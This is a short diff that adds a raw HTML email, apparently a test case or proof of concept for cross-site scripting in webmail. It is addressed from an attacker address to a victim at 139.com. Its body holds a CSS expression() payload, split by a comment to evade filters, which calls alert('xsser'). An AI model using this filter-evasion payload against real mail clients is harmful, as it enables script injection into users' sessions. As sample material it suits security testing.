@@ -1,0 +1,12 @@
+From: <attacker@attacker.com>
+Subject: notitle
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: text/html
+	
+<html>
+<body>
+<div style="width:exp/*
+*/ression(alert('xsser'))">xsser</div>
+</body>
+</html>
